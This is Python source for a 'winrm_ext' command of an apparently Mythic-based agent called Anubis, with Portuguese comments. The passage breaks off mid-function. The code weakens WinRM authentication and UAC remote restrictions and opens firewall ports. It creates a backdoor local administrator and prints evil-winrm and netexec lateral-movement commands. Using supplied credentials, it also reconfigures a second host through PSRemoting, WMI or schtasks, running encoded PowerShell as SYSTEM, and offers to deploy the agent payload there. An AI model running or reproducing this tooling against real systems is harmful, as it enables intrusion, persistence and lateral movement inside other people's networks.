    def winrm_ext(self, task_id, target="", port=5985, username="", password="",
                  domain="", socks_port=7005, add_user="", add_pass="", ssl=False,
                  action="", remote="", deploy=""):
        # winrm_ext — Anubis
        #  self-host : configura WinRM no host do agente (listener, auth, UAC, firewall)
        #  remote    : a partir do agente, configura WinRM em OUTRO host (lateral movement)
        #  deploy    : (com remote) copia e executa o payload do Anubis no host remoto
        # Imports dentro do método (o arquivo é spliced dentro da classe do agente).
        import os, json, time, uuid, socket, string, subprocess, tempfile, base64, ctypes
        try:
            import secrets
        except ImportError:
            import random as _r
            class _secrets:
                @staticmethod
                def choice(s):
                    return s[_r.randrange(len(s))]
            secrets = _secrets()

        if platform.system() != 'Windows':
            return "winrm_ext: setup functions require Windows (registry + SCM)"

        if isinstance(ssl, str):
            ssl = ssl.strip().lower() in ("1", "true", "yes", "sim")
        port = int(port)

        # ── MODO REMOTO (A → B) ────────────────────────────────────────────────
        if remote:
            return self._winrm_ext_remote(task_id, remote, port, username, password,
                                          domain, socks_port, add_user, add_pass, ssl,
                                          action, deploy)

        # ══════════════════════════════════════════════════════════════════════
        # MODO SELF-HOST — configura WinRM no próprio host do agente
        # ══════════════════════════════════════════════════════════════════════
        import winreg
        from ctypes import wintypes

        WSMAN_SVC  = r"SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Service"
        WSMAN_AUTH = WSMAN_SVC + r"\Auth"
        WSMAN_ROOT = r"SOFTWARE\Microsoft\Windows\CurrentVersion\WSMAN\Listener"
        UAC_POLICY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        STATE_FILE = os.path.join(tempfile.gettempdir(), "anubis_winrm_ext_state.json")
        socks_port = int(socks_port)
        if ssl and port == 5985:
            port = 5986

        class SERVICE_STATUS(ctypes.Structure):
            _fields_ = [
                ("dwServiceType",             wintypes.DWORD),
                ("dwCurrentState",            wintypes.DWORD),
                ("dwControlsAccepted",        wintypes.DWORD),
                ("dwWin32ExitCode",           wintypes.DWORD),
                ("dwServiceSpecificExitCode", wintypes.DWORD),
                ("dwCheckPoint",              wintypes.DWORD),
                ("dwWaitHint",                wintypes.DWORD),
            ]

        def get_dword(path, name):
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0,
                                    winreg.KEY_READ | 0x0100) as k:
                    v, _ = winreg.QueryValueEx(k, name)
                    return int(v)
            except OSError:
                return None

        def set_dword(path, name, value):
            with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, path, 0,
                                    winreg.KEY_SET_VALUE | 0x0100) as k:
                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, int(value))

        def delete_value(path, name):
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0,
                                    winreg.KEY_SET_VALUE | 0x0100) as k:
                    winreg.DeleteValue(k, name)
            except OSError:
                pass

        advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
        advapi32.OpenSCManagerW.argtypes = (wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD)
        advapi32.OpenSCManagerW.restype  = wintypes.HANDLE
        advapi32.OpenServiceW.argtypes   = (wintypes.HANDLE, wintypes.LPCWSTR, wintypes.DWORD)
        advapi32.OpenServiceW.restype    = wintypes.HANDLE
        advapi32.CloseServiceHandle.argtypes = (wintypes.HANDLE,)
        advapi32.CloseServiceHandle.restype  = wintypes.BOOL
        advapi32.ChangeServiceConfigW.argtypes = (
            wintypes.HANDLE, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD,
            wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPDWORD, wintypes.LPCWSTR,
            wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR)
        advapi32.ChangeServiceConfigW.restype = wintypes.BOOL
        advapi32.StartServiceW.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                                           ctypes.POINTER(wintypes.LPCWSTR))
        advapi32.StartServiceW.restype  = wintypes.BOOL
        advapi32.QueryServiceStatus.argtypes = (wintypes.HANDLE, ctypes.POINTER(SERVICE_STATUS))
        advapi32.QueryServiceStatus.restype  = wintypes.BOOL
        advapi32.ControlService.argtypes     = (wintypes.HANDLE, wintypes.DWORD,
                                                ctypes.POINTER(SERVICE_STATUS))
        advapi32.ControlService.restype      = wintypes.BOOL

        SERVICE_STOPPED = 0x1
        SERVICE_RUNNING = 0x4
        SERVICE_AUTO    = 0x2
        STOP            = 0x1
        SC_ALL          = 0xF003F
        SVC_ALL         = 0xF01FF
        NO_CHANGE       = 0xFFFFFFFF
        ERR_ALREADY_RUN = 1056
        ERR_NOT_ACTIVE  = 1062

        def _wait_state(h_svc, wanted, timeout=45):
            deadline = time.time() + timeout
            while time.time() < deadline:
                ss = SERVICE_STATUS()
                if not advapi32.QueryServiceStatus(h_svc, ctypes.byref(ss)):
                    raise ctypes.WinError(ctypes.get_last_error())
                if ss.dwCurrentState == wanted:
                    return True
                time.sleep(1)
            return False

        def ensure_winrm_service(restart=False):
            h_scm = advapi32.OpenSCManagerW(None, None, SC_ALL)
            if not h_scm:
                raise ctypes.WinError(ctypes.get_last_error())
            try:
                h_svc = advapi32.OpenServiceW(h_scm, "WinRM", SVC_ALL)
                if not h_svc:
                    raise ctypes.WinError(ctypes.get_last_error())
                try:
                    advapi32.ChangeServiceConfigW(h_svc, NO_CHANGE, SERVICE_AUTO,
                                                  NO_CHANGE, None, None, None, None,
                                                  None, None, None)
                    ss = SERVICE_STATUS()
                    running = (advapi32.QueryServiceStatus(h_svc, ctypes.byref(ss))
                               and ss.dwCurrentState == SERVICE_RUNNING)
                    if restart and running:
                        if not advapi32.ControlService(h_svc, STOP, ctypes.byref(ss)):
                            err = ctypes.get_last_error()
                            if err != ERR_NOT_ACTIVE:
                                raise ctypes.WinError(err)
                        if not _wait_state(h_svc, SERVICE_STOPPED):
                            raise RuntimeError("WinRM não parou (timeout)")
                    ctypes.set_last_error(0)
                    if not advapi32.StartServiceW(h_svc, 0, None):
                        err = ctypes.get_last_error()
                        if err != ERR_ALREADY_RUN:
                            raise ctypes.WinError(err)
                    if not _wait_state(h_svc, SERVICE_RUNNING):
                        raise RuntimeError("WinRM não iniciou (timeout)")
                finally:
                    advapi32.CloseServiceHandle(h_svc)
            finally:
                advapi32.CloseServiceHandle(h_scm)

        def listener_guids_on_port(p):
            found = []
            try:
                root = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WSMAN_ROOT, 0,
                                      winreg.KEY_READ | 0x0100)
            except OSError:
                return found
            try:
                i = 0
                while True:
                    try:
                        name = winreg.EnumKey(root, i)
                        i += 1
                    except OSError:
                        break
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                            WSMAN_ROOT + "\\" + name, 0,
                                            winreg.KEY_READ | 0x0100) as k:
                            v, _ = winreg.QueryValueEx(k, "Port")
                        if int(v) == int(p):
                            found.append(name)
                    except OSError:
                        continue
            finally:
                winreg.CloseKey(root)
            return found

        def ensure_listener(p, ssl_on, hostname, thumbprint=None):
            existing = listener_guids_on_port(p)
            if existing:
                return None
            guid = "{" + str(uuid.uuid4()).upper() + "}"
            with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                                    WSMAN_ROOT + "\\" + guid, 0,
                                    winreg.KEY_SET_VALUE | 0x0100) as k:
                winreg.SetValueEx(k, "Address",   0, winreg.REG_SZ,   "*")
                winreg.SetValueEx(k, "Transport", 0, winreg.REG_SZ,
                                  "HTTPS" if ssl_on else "HTTP")
                winreg.SetValueEx(k, "Port",      0, winreg.REG_DWORD, int(p))
                winreg.SetValueEx(k, "Enabled",   0, winreg.REG_DWORD, 1)
                winreg.SetValueEx(k, "URLPrefix", 0, winreg.REG_SZ,   "wsman")
                if ssl_on:
                    winreg.SetValueEx(k, "Hostname", 0, winreg.REG_SZ, hostname or "*")
                    winreg.SetValueEx(k, "CertificateThumbprint", 0,
                                      winreg.REG_SZ, thumbprint or "")
            return guid

        def add_firewall_rule(p):
            rule = "AnubisWinRM-%d" % p
            subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule",
                            "name=%s" % rule], capture_output=True)
            r = subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule",
                                "name=%s" % rule, "dir=in", "action=allow",
                                "protocol=TCP", "localport=%d" % p],
                               capture_output=True, text=True)
            if r.returncode != 0:
                raise RuntimeError("netsh add rule falhou: " +
                                   (r.stderr or r.stdout).strip()[:300])

        def add_local_admin(user, pwd):
            r = subprocess.run(["net", "user", user, pwd, "/add"],
                               capture_output=True, text=True)
            if r.returncode != 0:
                r = subprocess.run(["net", "user", user, pwd],
                                   capture_output=True, text=True)
                if r.returncode != 0:
                    raise RuntimeError("net user falhou: " +
                                       (r.stderr or r.stdout).strip()[:300])
            for group in ("Administrators", "Administradores"):
                r = subprocess.run(["net", "localgroup", group, user, "/add"],
                                   capture_output=True, text=True)
                if r.returncode == 0:
                    return
            ps = ("$ErrorActionPreference='Stop';"
                  "Add-LocalGroupMember -SID 'S-1-5-32-544' -Member '{0}'").format(user)
            r = subprocess.run(["powershell.exe", "-NoProfile", "-NonInteractive",
                                "-Command", ps], capture_output=True, text=True)
            if r.returncode != 0:
                raise RuntimeError("não consegui adicionar %s a Administrators" % user)

        def gen_password(n=16):
            alphabet = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
            return "".join(secrets.choice(alphabet) for _ in range(n))

        def probe(ip, p, timeout=4):
            try:
                with socket.create_connection((ip, p), timeout=timeout):
                    return True
            except OSError:
                return False

        def detect_local_ip():
            try:
                host = socket.gethostname()
                for info in socket.getaddrinfo(host, None, socket.AF_INET,
                                               socket.SOCK_STREAM):
                    ip = info[4][0]
                    if not ip.startswith("127."):
                        return ip
            except OSError:
                pass
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("1.1.1.1", 53))
                return s.getsockname()[0]
            except OSError:
                pass
            finally:
                s.close()
            return "127.0.0.1"

        def save_state(state):
            try:
                with open(STATE_FILE, "w", encoding="utf-8") as f:
                    json.dump(state, f)
            except OSError:
                pass

        def load_state():
            try:
                with open(STATE_FILE, "r", encoding="utf-8") as f:
                    return json.load(f)
            except OSError:
                return {}

        def create_cert(hostname):
            ps = ("$ErrorActionPreference='Stop';"
                  "$c = New-SelfSignedCertificate -DnsName '{0}' "
                  "-CertStoreLocation 'Cert:\\LocalMachine\\My';"
                  "Write-Output $c.Thumbprint").format(hostname.replace("'", "''"))
            r = subprocess.run(["powershell.exe", "-NoProfile", "-NonInteractive",
                                "-Command", ps], capture_output=True, text=True,
                               timeout=120)
            if r.returncode != 0:
                raise RuntimeError("New-SelfSignedCertificate falhou: " +
                                   (r.stderr or r.stdout).strip()[:300])
            return [ln.strip() for ln in r.stdout.splitlines() if ln.strip()][-1]

        if action == "cleanup":
            state = load_state()
            p = int(state.get("port", 5985))
            subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule",
                            "name=AnubisWinRM-%d" % p], capture_output=True)
            for guid in state.get("listeners", []):
                try:
                    winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, WSMAN_ROOT + "\\" + guid)
                except OSError:
                    pass
            reg = state.get("registry", {})
            for path, name, old in (
                (WSMAN_SVC,  "AllowUnencrypted", reg.get("allow_unencrypted")),
                (WSMAN_AUTH, "Basic",            reg.get("basic")),
                (UAC_POLICY, "LocalAccountTokenFilterPolicy", reg.get("uac")),
            ):
                if old is None:
                    delete_value(path, name)
                else:
                    set_dword(path, name, old)
            if state.get("user"):
                subprocess.run(["net", "user", state["user"], "/delete"],
                               capture_output=True)
            try:
                os.remove(STATE_FILE)
            except OSError:
                pass
            return "[+] Cleanup concluído (firewall, listeners, registro e usuário revertidos)"

        out = []
        ip = target or detect_local_ip()
        created_pass = None

        state = {"port": port, "listeners": [], "user": None, "registry": {}}
        state["registry"]["allow_unencrypted"] = get_dword(WSMAN_SVC, "AllowUnencrypted")
        state["registry"]["basic"]             = get_dword(WSMAN_AUTH, "Basic")
        state["registry"]["uac"]               = get_dword(UAC_POLICY, "LocalAccountTokenFilterPolicy")

        if not ssl:
            set_dword(WSMAN_SVC, "AllowUnencrypted", 1)
        set_dword(WSMAN_AUTH, "Basic", 1)
        set_dword(UAC_POLICY, "LocalAccountTokenFilterPolicy", 1)
        out.append("[+] Auth: AllowUnencrypted=%s, Basic=1 (Negotiate já ativo)"
                   % ("1" if not ssl else "n/a"))
        out.append("[+] UAC remoto: LocalAccountTokenFilterPolicy = 1 (admins locais OK)")

        thumb = None
        if ssl:
            thumb = create_cert(ip or socket.gethostname())
            out.append("[+] Certificado auto-assinado criado (thumb %s...)" % thumb[:8])

        guid = ensure_listener(port, ssl, ip or socket.gethostname(), thumb)
        if guid:
            state["listeners"].append(guid)
            out.append("[+] Listener %s/*:%d criado (%s)"
                       % ("HTTPS" if ssl else "HTTP", port, guid))
        else:
            out.append("[+] Listener %s/*:%d já existia — mantido"
                       % ("HTTPS" if ssl else "HTTP", port))

        ensure_winrm_service(restart=bool(guid))
        out.append("[+] WinRM: serviço ativo e AutoStart (SCM/ctypes)")

        add_firewall_rule(port)
        out.append("[+] Firewall: regra inbound TCP/%d (AnubisWinRM-%d)" % (port, port))

        if add_user:
            created_pass = add_pass or gen_password()
            add_local_admin(add_user, created_pass)
            state["user"] = add_user
            out.append("[+] Usuário local '%s' criado + Administrators" % add_user)

        save_state(state)

        out.append("")
        out.append("[+] TCP %s:%d — %s" % (ip, port,
                   "REACHABLE" if probe(ip, port) else "FALHOU (firewall/GPO?)"))
        out.append("[+] Tunnel SOCKS5: porta %d do servidor Mythic" % socks_port)
        out.append("")
        out.append("=" * 70)
        out.append(" COMANDOS DE MOVIMENTAÇÃO LATERAL (via SOCKS5)")
        out.append("=" * 70)

        ssl_flag = " -S" if ssl else ""
        display_user = ("%s\\%s" % (domain, username)) if (domain and username) else username

        if username and password:
            out.append("")
            out.append("-- evil-winrm (shell interativo + scripts) ----------------")
            out.append("  proxychains evil-winrm%s -i %s -u '%s' -p '%s' -P %d"
                       % (ssl_flag, ip, display_user, password, port))
            out.append("")
            out.append("-- netexec (SOCKS5 nativo — sem proxychains) --------------")
            nxc = "nxc winrm %s -u %s -p '%s'" % (ip, username, password)
            if domain:
                nxc += " -d %s" % domain
            nxc += " -P %d --proxy socks5://127.0.0.1:%d" % (port, socks_port)
            if ssl:
                nxc += " --use-ssl"
            out.append("  " + nxc)
            out.append("")
            out.append("-- PowerShell remoting (pwsh no Kali) ---------------------")
            out.append("  proxychains pwsh -Command \"$s = New-PSSession "
                       "-ComputerName %s -Port %d -Credential (Get-Credential); "
                       "Enter-PSSession $s\"" % (ip, port))

        if add_user:
            out.append("")
            out.append("-- Fallback (conta local criada por add_user) -------------")
            out.append("  proxychains evil-winrm%s -i %s -u %s -p '%s' -P %d"
                       % (ssl_flag, ip, add_user, created_pass, port))

        out.append("")
        out.append("=" * 70)
        if domain and username:
            out.append(" [*] Usuário : %s\\%s" % (domain, username))
        elif username:
            out.append(" [*] Usuário : %s" % username)
        if add_user:
            out.append(" [*] Local   : %s (Administrators)" % add_user)
        out.append(" [*] Alvo    : %s:%d" % (ip, port))
        out.append(" [*] Limpeza : winrm_ext {\"action\":\"cleanup\"}")
        out.append("=" * 70)

        return "\n".join(out)

    def _winrm_ext_remote(self, task_id, host, port=5985, username="", password="",
                          domain="", socks_port=7005, add_user="", add_pass="",
                          ssl=False, action="", deploy=""):
        # winrm_ext (remote) — a partir do HOST-A (agente), configura WinRM no
        # HOST-B remoto e retorna acesso por 2 vias (SOCKS5 do Mythic / jump via agente).
        # Cadeia: PSRemoting → WMI (CIM) → SMB (reg+SCM+schtasks)
        import os, json, time, uuid, socket, string, subprocess, tempfile, base64
        try:
            import secrets
        except ImportError:
            import random as _r
            class _secrets:
                @staticmethod
                def choice(s):
                    return s[_r.randrange(len(s))]
            secrets = _secrets()

        if platform.system() != 'Windows':
            return "winrm_ext (remote): setup functions require Windows"
        if not (username and password):
            return ("[!] winrm_ext (remote): credenciais obrigatórias "
                    "(username/password) para configurar o host remoto.")

        if isinstance(ssl, str):
            ssl = ssl.strip().lower() in ("1", "true", "yes", "sim")
        port = int(port)
        socks_port = int(socks_port)
        if ssl and port == 5985:
            port = 5986

        RSTATE = os.path.join(tempfile.gettempdir(), "anubis_winrm_ext_remote_state.json")

        out = []

        def log(m):
            out.append(m)

        def esc(s):
            return str(s).replace("'", "''")

        def run(cmd, timeout=120):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
                return r.returncode, ((r.stdout or "") + (r.stderr or "")).strip()
            except Exception as e:
                return -1, str(e)

        def ps_local(script, timeout=240):
            return run(["powershell.exe", "-NoProfile", "-NonInteractive",
                        "-ExecutionPolicy", "Bypass", "-Command", script], timeout)

        def cred_ps(dom, user, pw):
            return ("$sec=ConvertTo-SecureString '%s' -AsPlainText -Force;"
                    "$cred=New-Object System.Management.Automation.PSCredential('%s\\%s',$sec);"
                    % (esc(pw), esc(dom), esc(user)))

        def probe(ip, p, timeout=3):
            try:
                with socket.create_connection((ip, p), timeout=timeout):
                    return True
            except OSError:
                return False

        def net_use(share="IPC$"):
            full = ("%s\\%s" % (domain, username)) if domain else username
            run(["net", "use", "\\\\%s\\%s" % (host, share), "/user:%s" % full, password])

        def net_use_del():
            run(["net", "use", "\\\\%s\\IPC$" % host, "/delete", "/y"])

        def gen_password(n=16):
            alphabet = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
            return "".join(secrets.choice(alphabet) for _ in range(n))

        dom_user = ("%s\\%s" % (domain, username)) if domain else username

        # ── CLEANUP REMOTO ─────────────────────────────────────────────────────
        if action == "cleanup":
            try:
                with open(RSTATE, "r", encoding="utf-8") as f:
                    st = json.load(f)
            except OSError:
                return "[!] cleanup remoto: state file não encontrado (%s)" % RSTATE
            host = st.get("host") or host
            port = int(st.get("port") or port)
            user = st.get("user") or ""
            revert_sb = (
                "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Service' "
                "/v AllowUnencrypted /t REG_DWORD /d 0 /f 2>$null | Out-Null;"
                "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Service\\Auth' "
                "/v Basic /t REG_DWORD /d 0 /f 2>$null | Out-Null;"
                "reg delete 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' "
                "/v LocalAccountTokenFilterPolicy /f 2>$null | Out-Null;"
                "Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Listener' "
                "-ErrorAction SilentlyContinue | ForEach-Object { "
                "$pp = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue; "
                "if ($pp.Port -eq %d) { Remove-Item $_.PSPath -Recurse -Force } };"
                "netsh advfirewall firewall delete rule name=AnubisWinRM-%d 2>$null | Out-Null;"
                "try { Restart-Service WinRM -Force -ErrorAction SilentlyContinue } catch {};"
                "Write-Output 'REVERT_DONE'"
            ) % (port, port)
            if user:
                revert_sb = "net user %s /delete 2>$null | Out-Null;" % user + revert_sb

            enc = base64.b64encode(revert_sb.encode("utf-16le")).decode()
            ok = False
            # 1) PSRemoting (WinRM já ativo — configurado por nós)
            ps = (cred_ps(domain, username, password) +
                  "Invoke-Command -ComputerName '%s' -Credential $cred "
                  "-Authentication Negotiate -ScriptBlock { %s } -ErrorAction Stop"
                  % (esc(host), revert_sb))
            rc, res = ps_local(ps)
            ok = (rc == 0 and "REVERT_DONE" in res)
            if not ok:
                # 2) WMI (CIM)
                ps = (cred_ps(domain, username, password) +
                      "$p=Invoke-CimMethod -ClassName Win32_Process -ComputerName '%s' "
                      "-Credential $cred -Arguments @{CommandLine='powershell -NoProfile "
                      "-NonInteractive -ExecutionPolicy Bypass -EncodedCommand %s'} "
                      "-ErrorAction Stop;Write-Output $p.ReturnValue" % (esc(host), enc))
                rc, res = ps_local(ps)
                ok = rc == 0 and res.strip().splitlines()[-1].strip() == "0"
            if not ok:
                # 3) schtasks/SMB
                net_use()
                try:
                    rc1, _ = run(["schtasks", "/create", "/s", host, "/u", dom_user,
                                  "/p", password, "/tn", "anubis_revert", "/tr",
                                  "powershell -NoProfile -NonInteractive -ExecutionPolicy "
                                  "Bypass -EncodedCommand %s" % enc,
                                  "/sc", "ONCE", "/st", "23:59", "/ru", "SYSTEM", "/f"])
                    if rc1 == 0:
                        rc2, _ = run(["schtasks", "/run", "/s", host, "/u", dom_user,
                                      "/p", password, "/tn", "anubis_revert"])
                        run(["schtasks", "/delete", "/s", host, "/u", dom_user,
                             "/p", password, "/tn", "anubis_revert", "/f"])
                        ok = (rc2 == 0)
                finally:
                    net_use_del()
            if ok:
                try:
                    os.remove(RSTATE)
                except OSError:
                    pass
                return ("[+] Cleanup remoto concluído em %s — WinRM, firewall, "
                        "registro e usuário revertidos" % host)
            return "[!] Cleanup remoto falhou em %s: %s" % (host, res[:200])

        # ---------- bootstrap script (roda DENTRO do host remoto) ----------
        if ssl:
            sb_extra = (
                "$c=New-SelfSignedCertificate -DnsName '%s' "
                "-CertStoreLocation 'Cert:\\LocalMachine\\My' 2>$null;"
                "winrm create winrm/config/Listener?Address=*+Transport=HTTPS "
                "@{Hostname='%s';CertificateThumbprint=$c.Thumbprint;Port='%d'} "
                "2>$null | Out-Null;" % (esc(host), esc(host), port))
        else:
            sb_extra = ("winrm set winrm/config/Listener?Address=*+Transport=HTTP "
                        "@{Port='%d'} 2>$null | Out-Null;" % port)

        bootstrap_sb = (
            "try { winrm quickconfig -quiet 2>$null | Out-Null } catch {};"
            "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Service' "
            "/v AllowUnencrypted /t REG_DWORD /d 1 /f | Out-Null;"
            "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Service\\Auth' "
            "/v Basic /t REG_DWORD /d 1 /f | Out-Null;"
            "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' "
            "/v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f | Out-Null;"
            "netsh advfirewall firewall delete rule name=AnubisWinRM-%d | Out-Null;"
            "netsh advfirewall firewall add rule name=AnubisWinRM-%d dir=in "
            "action=allow protocol=TCP localport=%d | Out-Null;"
            "%s"
            "try { Restart-Service WinRM -Force -ErrorAction Stop | Out-Null } catch {};"
            "Write-Output ('WINRM_READY ' + (Get-Service WinRM).Status)"
        ) % (port, port, port, sb_extra)

        # ---------- execução remota genérica (PSRemoting → WMI → schtasks) ----------
        def exec_remote(ps_cmd, timeout=240):
            """Executa comando PowerShell no host remoto. Retorna (ok, metodo, resumo)."""
            if ps_ok:
                ps = (cred_ps(domain, username, password) +
                      "Invoke-Command -ComputerName '%s' -Credential $cred "
                      "-Authentication Negotiate -ScriptBlock { %s } -ErrorAction Stop"
                      % (esc(host), ps_cmd))
                rc, res = ps_local(ps, timeout)
                if rc == 0 and res and not res.lower().startswith(
                        ("error", "access denied", "connecting to remote")):
                    return True, "PSRemoting", res[:500]
            enc = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
            ps = (cred_ps(domain, username, password) +
                  "$p=Invoke-CimMethod -ClassName Win32_Process -ComputerName '%s' "
                  "-Credential $cred -Arguments @{CommandLine='powershell -NoProfile "
                  "-NonInteractive -ExecutionPolicy Bypass -EncodedCommand %s'} "
                  "-ErrorAction Stop;Write-Output $p.ReturnValue" % (esc(host), enc))
            rc, res = ps_local(ps, timeout)
            if rc == 0:
                last = [l for l in res.splitlines() if l.strip()]
                if last and last[-1].strip() == "0":
                    return True, "WMI", ""
            net_use()
            try:
                rc1, _ = run(["schtasks", "/create", "/s", host, "/u", dom_user,
                              "/p", password, "/tn", "anubis_exec", "/tr",
                              "powershell -NoProfile -NonInteractive -ExecutionPolicy "
                              "Bypass -EncodedCommand %s" % enc,
                              "/sc", "ONCE", "/st", "23:59", "/ru", "SYSTEM", "/f"])
                if rc1 == 0:
                    rc2, _ = run(["schtasks", "/run", "/s", host, "/u", dom_user,
                                  "/p", password, "/tn", "anubis_exec"])
                    run(["schtasks", "/delete", "/s", host, "/u", dom_user,
                         "/p", password, "/tn", "anubis_exec", "/f"])
                    if rc2 == 0:
                        return True, "schtasks/SMB", ""
            finally:
                net_use_del()
            return False, None, ""

        # ================== 1) PROBE ==================
        log("[*] winrm_ext (remote) — HOST-A → %s (%s)" % (host, "HTTPS" if ssl else "HTTP"))
        log("[*] Porta alvo: %d | Credencial: %s" % (port, dom_user))
        w_open = probe(host, port)
        w445 = probe(host, 445)
        w135 = probe(host, 135)
        log("[+] Probe: %s:%d=%s | 445=%s | 135=%s" % (
            host, port, "OPEN" if w_open else "closed",
            "OPEN" if w445 else "closed", "OPEN" if w135 else "closed"))

        ps_ok = False
        sb_guid = ""

        # ================== 2) BOOTSTRAP ==================
        if w_open:
            # WinRM já escuta → aplica ajustes via PSRemoting
            ps = (cred_ps(domain, username, password) +
                  "Invoke-Command -ComputerName '%s' -Credential $cred "
                  "-Authentication Negotiate -ScriptBlock { %s } -ErrorAction Stop"
                  % (esc(host), bootstrap_sb))
            rc, res = ps_local(ps)
            if rc == 0 and "WINRM_READY" in res:
                ps_ok = True
                log("[+] PSRemoting: WinRM ajustado no remoto (%s)"
                    % [l for l in res.splitlines() if "WINRM_READY" in l][-1].strip())
            else:
                log("[!] PSRemoting falhou: %s" % res[:250])

        if not ps_ok and (w135 or w445):
            # Bootstrap via WMI (CIM) — roda o script no remoto sem WinRM
            enc = base64.b64encode(bootstrap_sb.encode("utf-16le")).decode()
            ps = (cred_ps(domain, username, password) +
                  "$p=Invoke-CimMethod -ClassName Win32_Process -ComputerName '%s' "
                  "-Credential $cred -Arguments @{CommandLine='powershell -NoProfile "
                  "-NonInteractive -ExecutionPolicy Bypass -EncodedCommand %s'} "
                  "-ErrorAction Stop;Write-Output $p.ReturnValue" % (esc(host), enc))
            rc, res = ps_local(ps)
            if rc == 0 and res.strip().splitlines()[-1].strip() == "0":
                log("[+] WMI (CIM): bootstrap disparado no remoto (RC=0)")
                time.sleep(8)
                if probe(host, port):
                    ps = (cred_ps(domain, username, password) +
                          "Invoke-Command -ComputerName '%s' -Credential $cred "
                          "-Authentication Negotiate -ScriptBlock { whoami; "
                          "(Get-Service WinRM).Status } -ErrorAction Stop" % esc(host))
                    rc, res = ps_local(ps)
                    if rc == 0 and res.strip():
                        ps_ok = True
                        log("[+] WMI bootstrap OK — WinRM agora responde, PSRemoting validado")
                    else:
                        log("[!] WinRM subiu mas PSRemoting falhou: %s" % res[:200])
                else:
                    log("[!] WMI bootstrap OK mas porta %d não abriu (GPO/firewall?)" % port)
            else:
                log("[!] WMI (CIM) falhou: %s" % res[:250])

        if not ps_ok and w445:
            # Fallback SMB: reg remoto + SCM remoto (cria listener sem executar nada no B)
            net_use()
            try:
                reg_base = ("\\\\%s\\HKLM\\SOFTWARE\\Microsoft\\Windows\\"
                            "CurrentVersion\\WSMAN" % host)
                steps = [
                    ["reg", "add", reg_base + "\\Service", "/v", "AllowUnencrypted",
                     "/t", "REG_DWORD", "/d", "1", "/f"],
                    ["reg", "add", reg_base + "\\Service\\Auth", "/v", "Basic",
                     "/t", "REG_DWORD", "/d", "1", "/f"],
                    ["reg", "add",
                     "\\\\%s\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\"
                     "Policies\\System" % host, "/v", "LocalAccountTokenFilterPolicy",
                     "/t", "REG_DWORD", "/d", "1", "/f"],
                ]
                sb_guid = "{" + str(uuid.uuid4()).upper() + "}"
                listener = reg_base + "\\Listener\\" + sb_guid
                steps += [
                    ["reg", "add", listener, "/v", "Address", "/t", "REG_SZ", "/d", "*", "/f"],
                    ["reg", "add", listener, "/v", "Transport", "/t", "REG_SZ",
                     "/d", "HTTP", "/f"],
                    ["reg", "add", listener, "/v", "Port", "/t", "REG_DWORD",
                     "/d", str(port), "/f"],
                    ["reg", "add", listener, "/v", "Enabled", "/t", "REG_DWORD", "/d", "1", "/f"],
                    ["reg", "add", listener, "/v", "URLPrefix", "/t", "REG_SZ",
                     "/d", "wsman", "/f"],
                ]
                ok = True
                for s in steps:
                    rc, res = run(s)
                    if rc != 0:
                        ok = False
                        log("[!] reg remoto falhou: %s" % res[:150])
                        break
                if ok:
                    run(["sc", "\\\\%s" % host, "config", "WinRM", "start=", "auto"])
                    run(["sc", "\\\\%s" % host, "stop", "WinRM"])
                    rc, res = run(["sc", "\\\\%s" % host, "start", "WinRM"])
                    if rc == 0:
                        log("[+] SMB (reg+SCM): listener %s e serviço WinRM ativos no remoto" % sb_guid)
                        if ssl:
                            log("[!] ssl no modo SMB: certificado precisa existir no remoto "
                                "(recomendo HTTP via tunnel)")
                        rcfw, rfw = run(["netsh", "-r", "\\\\%s" % host, "-u", dom_user,
                                         "-p", password, "advfirewall", "firewall",
                                         "add", "rule", "name=AnubisWinRM-%d" % port,
                                         "dir=in", "action=allow", "protocol=TCP",
                                         "localport=%d" % port])
                        if rcfw == 0:
                            log("[+] Firewall remoto: AnubisWinRM-%d via netsh -r" % port)
                        else:
                            log("[!] netsh -r falhou (%s) — adicionar regra manualmente" % rfw[:120])
                        time.sleep(5)
                        if probe(host, port):
                            ps = (cred_ps(domain, username, password) +
                                  "Invoke-Command -ComputerName '%s' -Credential $cred "
                                  "-Authentication Negotiate -ScriptBlock { whoami; "
                                  "(Get-Service WinRM).Status } -ErrorAction Stop" % esc(host))
                            rc, res = ps_local(ps)
                            if rc == 0 and res.strip():
                                ps_ok = True
                                log("[+] SMB bootstrap OK — PSRemoting validado no remoto")
                    else:
